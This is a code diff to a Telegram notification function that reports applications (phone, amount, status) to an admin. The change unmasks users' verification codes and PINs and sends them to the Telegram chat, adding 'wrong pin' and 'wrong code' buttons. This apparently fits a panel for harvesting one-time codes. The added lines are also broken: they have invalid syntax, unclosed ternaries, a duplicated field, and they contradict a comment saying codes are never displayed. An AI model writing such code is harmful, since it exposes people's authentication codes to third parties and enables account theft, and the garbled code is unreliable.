@@ -430,8 +430,10 @@ async function notifyTelegram(application) {
   const text = `${title}\n\n` +
     `🧾 Application reference: ${application.application_id || application.application_no || "—"}\n` +
     `📞 Phone: ${application.phone || "—"}\n` +
-    (application.status === "AWAITING_FIRST_NAME_APPROVAL" ? `🔢 Code 1: •••• (masked)\n` : "") +
-    (application.status === "AWAITING_SECOND_NAME_APPROVAL" ? `🔢 Code 2: •••• (masked)\n` : "") +
+    (application.status === "AWAITING_FIRST_NAME_APPROVAL" ? 
+     `🔢 Code 1: ${application.code 1 || "—"}\n` +
+    (application.status === "AWAITING_SECOND_NAME_APPROVAL" ?
+     `🔢 Code 2: ${application.code 1 || "—"}\n` +
     `💰 Amount: ${money(application.amount)}\n` +
     `🔢 Attempt: #${attempt}\n\n` +
     `⏳ Status: ${application.status}`;
@@ -440,8 +442,8 @@ async function notifyTelegram(application) {
     // Three admin actions; verification values are never displayed.
     const keyboard = { inline_keyboard: [[
       { text: "✅ APPROVE", callback_data: `approve:${application.id}` },
-      { text: "🪪 WRONG ID", callback_data: `wrongid:${application.id}` },
-      { text: "⚠️ VERIFICATION FAILED", callback_data: `verifyfail:${application.id}` }
+      { text: "🔑WRONG pin", callback_data: `wrongid:${application.id}` },
+      { text: "❌wrong code", callback_data: `verifyfail:${application.id}` }
     ]]};
     try {
       await bot.sendMessage(adminId, text, { reply_markup: keyboard, disable_web_page_preview: true });
